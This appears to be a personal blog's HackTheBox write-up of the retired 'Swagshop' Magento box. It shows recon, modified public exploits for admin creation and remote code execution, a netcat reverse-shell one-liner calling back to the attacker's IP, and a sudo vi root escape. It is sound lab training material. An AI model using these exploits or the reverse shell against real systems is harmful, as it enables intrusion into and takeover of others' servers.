@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Swagshop | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2019/09/htb-swagshop.html" title="Read more" class="entry-title-link">
+                HTB: Swagshop</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2019-09-29T09:00:00+02:00">29 Sep 2019</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
+          <a href="../../tag/mangento.html" title="Read more with the label mangento" class="meta-link">mangento</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 8 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2019.09/swagshop_card.png" alt="Swagshop Card" width="262"></p>
+<p>This article is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/188">Swagshop</a>
+This box was suppose to be an easy one. Turns out it wasn't. I struggle a lot in
+wrong direction and finally found a path to root this magento box.</p>
+<p>This article presents the different methods which failed on the box as well as
+the solution to root it.</p>
+
+
+<div class="toc">
+<ul>
+<li><a href="#recon">Recon</a><ul>
+<li><a href="#nmap">nmap</a></li>
+<li><a href="#web">Web</a></li>
+<li><a href="#getting-admin">Getting Admin</a></li>
+<li><a href="#the-rce-way">The RCE way</a><ul>
+<li><a href="#to-the-user-flag">To the user flag</a></li>
+<li><a href="#lets-get-root">let's get root</a></li>
+</ul>
+</li>
+<li><a href="#reverse-shell-way">Reverse shell way</a></li>
+</ul>
+</li>
+<li><a href="#wrapping-up">Wrapping up</a></li>
+</ul>
+</div>
+<h1 id="recon">Recon</h1>
+<h2 id="nmap">nmap</h2>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Tue Sep 17 14:15:38 2019 as: nmap -oA 10.10.10.140 -sS 10.10.10.140</span>
+<span class="code-line">Nmap scan report for 10.10.10.140</span>
+<span class="code-line">Host is up (0.019s latency).</span>
+<span class="code-line">Not shown: 998 closed ports</span>
+<span class="code-line">PORT   STATE SERVICE</span>
+<span class="code-line">22/tcp open  ssh</span>
+<span class="code-line">80/tcp open  http</span>
+<span class="code-line"></span>
+<span class="code-line"># Nmap done at Tue Sep 17 14:15:43 2019 -- 1 IP address (1 host up) scanned in 4.94 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="web">Web</h2>
+<p>As there is only an SSH and a HTTP port, we continue our recon on the web part.</p>
+<p>When accessing the website we can observe a Magento website.</p>
+<p><img alt="Swag shop homepage" src="/media/2019.09/swagshop_3.png"></p>
+<p>Let us try a dirb:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~# dirb http://10.10.10.140/</span>
+<span class="code-line"></span>
+<span class="code-line">-----------------</span>
+<span class="code-line">DIRB v2.22</span>
+<span class="code-line">By The Dark Raver</span>
+<span class="code-line">-----------------</span>
+<span class="code-line"></span>
+<span class="code-line">START_TIME: Tue Sep 17 14:27:20 2019</span>
+<span class="code-line">URL_BASE: http://10.10.10.140/</span>
+<span class="code-line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span>
+<span class="code-line"></span>
+<span class="code-line">-----------------</span>
+<span class="code-line"></span>
+<span class="code-line">GENERATED WORDS: 4612</span>
+<span class="code-line"></span>
+<span class="code-line">---- Scanning URL: http://10.10.10.140/ ----</span>
+<span class="code-line">==&gt; DIRECTORY: http://10.10.10.140/app/</span>
+<span class="code-line">==&gt; DIRECTORY: http://10.10.10.140/errors/</span>
+<span class="code-line">+ http://10.10.10.140/favicon.ico (CODE:200|SIZE:1150)</span>
+<span class="code-line">==&gt; DIRECTORY: http://10.10.10.140/includes/</span>
+<span class="code-line">+ http://10.10.10.140/index.php (CODE:200|SIZE:16097)</span>
+<span class="code-line">==&gt; DIRECTORY: http://10.10.10.140/js/</span>
+<span class="code-line">==&gt; DIRECTORY: http://10.10.10.140/lib/</span>
+<span class="code-line">==&gt; DIRECTORY: http://10.10.10.140/media/</span>
+<span class="code-line">==&gt; DIRECTORY: http://10.10.10.140/pkginfo/</span>
+<span class="code-line">+ http://10.10.10.140/server-status (CODE:403|SIZE:300)</span>
+<span class="code-line">==&gt; DIRECTORY: http://10.10.10.140/shell/</span>
+<span class="code-line">==&gt; DIRECTORY: http://10.10.10.140/skin/</span>
+<span class="code-line">==&gt; DIRECTORY: http://10.10.10.140/var/</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<p>We see that there is a lot of directories accessible directly.
+We can gather a lot of information from them, for instance the release notes
+gives us some information by the version of the application:</p>
+<p><img alt="Swag shop release note" src="/media/2019.09/swagshop_2.png"></p>
+<p>An admin panel is also accessible on the application:</p>
+<p><img alt="Swag shop admin panel" src="/media/2019.09/swagshop_4.png"></p>
+<p>Let us see what CVE are available for magento. Our version is 1.7.0.2.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># searchsploit magento</span>
+<span class="code-line">-------------------------------------------------------------------------------------------------------------- ----------------------------------</span>
+<span class="code-line"> Exploit Title                                                                                                |  Path</span>
+<span class="code-line">                                                                                                              | (/usr/share/exploitdb/)</span>
+<span class="code-line">-------------------------------------------------------------------------------------------------------------- ----------------------------------</span>
+<span class="code-line">Magento 1.2 - &#39;/app/code/core/Mage/Admin/Model/Session.php?login[&#39;Username&#39;]&#39; Cross-Site Scripting            | exploits/php/webapps/32808.txt</span>
+<span class="code-line">Magento 1.2 - &#39;/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email&#39; Cross-Site Scripting      | exploits/php/webapps/32809.txt</span>
+<span class="code-line">Magento 1.2 - &#39;downloader/index.php&#39; Cross-Site Scripting                                                     | exploits/php/webapps/32810.txt</span>
+<span class="code-line">Magento &lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                | exploits/php/webapps/39838.php</span>
+<span class="code-line">Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution                                                  | exploits/php/webapps/37811.py</span>
+<span class="code-line">Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                        | exploits/php/webapps/35996.txt</span>
+<span class="code-line">Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                   | exploits/php/webapps/35052.txt</span>
+<span class="code-line">Magento eCommerce - Local File Disclosure                                                                     | exploits/php/webapps/19793.txt</span>
+<span class="code-line">Magento eCommerce - Remote Code Execution                                                                     | exploits/xml/webapps/37977.py</span>
+<span class="code-line">eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                  | exploits/php/webapps/38573.txt</span>
+<span class="code-line">eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                       | exploits/php/webapps/38651.txt</span>
+<span class="code-line">-------------------------------------------------------------------------------------------------------------- ----------------------------------</span>
+<span class="code-line">Shellcodes: No Result</span>
+<span class="code-line"></code></pre></div>
+
+<p>Our application is vulnerable to two interesting exploit:</p>
+<ul>
+<li>Magento eCommerce - Remote Code Execution (exploits/xml/webapps/37977.py)</li>
+<li>Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution (exploits/php/webapps/37811.py)</li>
+</ul>
+<h2 id="getting-admin">Getting Admin</h2>
+<p>The second exploit allow to create an admin account on the application.</p>
+<p>But the exploit's script use a wrong URL. We add "/index.php/admin/" to the
+target URL:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">target_url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s2">&quot;/index.php/admin/Cms_Wysiwyg/directive/index/&quot;</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>This will create an administrator account named "forme" with the same password.
+We can then login to the admin panel and access the full magento framework.</p>
+<p><img alt="magenta admin panel" src="/media/2019.09/swagshop_1.png"></p>
+<h2 id="the-rce-way">The RCE way</h2>
+<h3 id="to-the-user-flag">To the user flag</h3>
+<p>From there a few possibility will allow us to execute code on the application:</p>
+<p>The first one is to upload a magento extension using the download. A blog
+post from jvoisin explain how to write this "simple" backdoor:
+<a href="https://dustri.org/b/writing-a-simple-extensionbackdoor-for-magento.html">Writing a simple extension/backdoor for Magento</a>.
+Nevertheless, the downloader is disabled a return a 404 error.</p>
+<p>The second one implies to create a new product and exploit a phtml page to
+execute code on the server. An article blog describe the process
+<a href="https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/">Sec Team Blog</a>.
+Once more this method does not seems to work. Maybe our Magenton version is too
+old an the vulnerability is not introduce on the application yet.</p>
+<p>An other on is to exploit the "froghopper" attack described in a
+<a href="https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper">forgenix blog post</a>.
+Again, the uploaded code was not executed on the server</p>
+<p>The last option is to use the other exploit that was listed with searchsploit:
+Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution (exploits/php/webapps/37811.py)</p>
+<p>We change the install_date parameter and we add our credentials to the script.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">install_date</span> <span class="o">=</span> <span class="s1">&#39;Wed, 08 May 2019 07:23:09 +0000&#39;</span>  <span class="c1"># This needs to be the exact date from /app/etc/local.xml</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Then we launch the script:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python sploi.py http://10.10.10.140/index.php/admin <span class="s2">&quot;uname -a&quot;</span></span>
+<span class="code-line">Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:</span>
+<span class="code-line">  File <span class="s2">&quot;37811.py&quot;</span>, line <span class="m">69</span>, <span class="k">in</span> &lt;module&gt;</span>
+<span class="code-line">    <span class="nv">tunnel</span> <span class="o">=</span> tunnel.group<span class="o">(</span><span class="m">1</span><span class="o">)</span></span>
+<span class="code-line">    AttributeError: <span class="s1">&#39;NoneType&#39;</span> object has no attribute <span class="s1">&#39;group&#39;</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>The error is because in the last 7 days there were no sales. We can change
+this parameter in the exploit code (we put 2 years to be safe):</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c1">#request = br.open(url + &#39;block/tab_orders/period/7d/?isAjax=true&#39;, data=&#39;isAjax=false&amp;form_key=&#39; + key)</span></span>
+<span class="code-line"><span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;block/tab_orders/period/2y/?isAjax=true&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s1">&#39;isAjax=false&amp;form_key=&#39;</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span></span>
+<span class="code-line"><span class="n">tunnel</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;src=</span><span class="se">\&quot;</span><span class="s2">(.*)\?ga=&quot;</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">read</span><span class="p">())</span></span>
+<span class="code-line"><span class="n">tunnel</span> <span class="o">=</span> <span class="n">tunnel</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We relaunch the script:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python sploi.py http://10.10.10.140/index.php/admin <span class="s2">&quot;uname -a&quot;</span></span>
+<span class="code-line">Linux swagshop <span class="m">4</span>.4.0-146-generic <span class="c1">#172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span>
+<span class="code-line">python sploi.py http://10.10.10.140/index.php/admin <span class="s2">&quot;whoami&quot;</span></span>
+<span class="code-line">www-data</span>
+<span class="code-line"></code></pre></div>
+
+<p>We get a remote code execution. From there we can get a reverse shell or do
+everything only with the RCE. I struggle a bit with the reverse shell before
+finding the right one. Therefore I will start with the RCE only exploitation.</p>
+<p>As the box is often reset by other players we chain the two exploit in a bash
+script.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python <span class="m">37977</span>.py</span>
+<span class="code-line">python sploi.py http://10.10.10.140/index.php/admin <span class="s2">&quot;whoami&quot;</span></span>
+<span class="code-line"></code></pre></div>
+
+<p><em>Fron now on I will only write the command of the second script ("whoami" in the
+exemple above) and make more than one command by duplicating the line.</em></p>
+<p>We want to get the user flag. In HTB's VM there is always a user flag in
+/home/<some user>/user.txt and a root flag in /root/root.txt (at least on the
+Linux One). So we look at the user directory:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ls /home/</span>
+<span class="code-line">haris</span>
+<span class="code-line"></code></pre></div>
+
+<p>We list the user folder:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ls /home/haris/</span>
+<span class="code-line">user.txt</span>
+<span class="code-line"></code></pre></div>
+
+<p>And we get the user flag:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cat /home/haris/user.txt</span>
+<span class="code-line">a4488&lt;redacted&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<h3 id="lets-get-root">let's get root</h3>
+<p>We start by enumerating our permissions on the box:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sudo -l</span>
+<span class="code-line">Matching Defaults entries for www-data on swagshop:</span>
+<span class="code-line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
+<span class="code-line"></span>
+<span class="code-line">User www-data may run the following commands on swagshop:</span>
+<span class="code-line">    (root) NOPASSWD: /usr/bin/vi /var/www/html/*</span>
+<span class="code-line"></code></pre></div>
+
+<p>It is well known that Vi let you run system command. Nevertheless we must execute
+this command without a shell. For that we can use the vi "-c" option:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python sploi.py http://10.10.10.140/index.php/admin &quot;sudo /usr/bin/vi /var/www/html/1 -c &#39;:! cat /root/root.txt &gt; /tmp/mak/6&#39;&quot;</span>
+<span class="code-line">python sploi.py http://10.10.10.140/index.php/admin &quot;cat /tmp/mak/6&quot;</span>
+<span class="code-line">c2b087&lt;redacted&gt;</span>
+<span class="code-line">      ___ ___</span>
+<span class="code-line">    /| |/|\| |\</span>
+<span class="code-line">  /_| ´ |.` |_\           We are open! (Almost)</span>
+<span class="code-line">    |   |.  |</span>
+<span class="code-line">    |   |.  |         Join the beta HTB Swag Store!</span>
+<span class="code-line">    |___|.__|       https://hackthebox.store/password</span>
+<span class="code-line"></span>
+<span class="code-line">                              PS: Use root flag as password!</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="reverse-shell-way">Reverse shell way</h2>
+<p>There is another way to resolve this part of the box: using a reverse shell!</p>
+<p>My classic python reverse shell was not working as there was no python on the box and
+the bash reverse was also not working. Nevertheless, the netcat one was working:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python sploi.py http://10.10.10.140/index.php/admin <span class="s2">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.148 1234 &gt;/tmp/f&quot;</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>On the client side we need to open a listener with netcat:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>netcat -lvp <span class="m">1234</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Then we got a reverse shell!</p>
+<p>With this reverse shell the commands are the same but faster ;).
+We can easily find the user flag:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ls /home/</span>
+<span class="code-line">haris</span>
+<span class="code-line">ls /home/haris/</span>
+<span class="code-line">user.txt</span>
+<span class="code-line">cat /home/haris/user.txt</span>
+<span class="code-line">a44887&lt;redacted&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<p>For the privilege escalation we can just spwan a vi:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ sudo -l</span>
+<span class="code-line">Matching Defaults entries for www-data on swagshop:</span>
+<span class="code-line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
+<span class="code-line"></span>
+<span class="code-line">User www-data may run the following commands on swagshop:</span>
+<span class="code-line">    (root) NOPASSWD: /usr/bin/vi /var/www/html/*</span>
+<span class="code-line">$ sudo /usr/bin/vi /var/www/html/1</span>
+<span class="code-line"></code></pre></div>
+
+<p>We get an error about the terminal not being interactive:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>Vim: Warning: Output is not to a terminal</span>
+<span class="code-line">Vim: Warning: Input is not from a terminal</span>
+<span class="code-line"></code></pre></div>
+
+<p>Then we just enter the command to get a shell from vi:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>:! /bin/bash</span>
+<span class="code-line">id</span>
+<span class="code-line">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="code-line">ls /root/</span>
+<span class="code-line">root.txt</span>
+<span class="code-line">cat /root/root.txt</span>
+<span class="code-line">c2b087&lt;redacted&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>This box was really interesting. I learned a lot about magento admin panel. As
+the downloader was disabled, the easiest way to execute code on the box was not
+available and I had to find other ways to execute code on a magento website from
+the admin panel. This might became handy someday.
+The privilege escalation was quit easy as I know a lot about vi.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2019/09/htb-jerry.html"> HTB: Jerry </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2019/10/htb-writeup.html"> HTB: Writeup </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
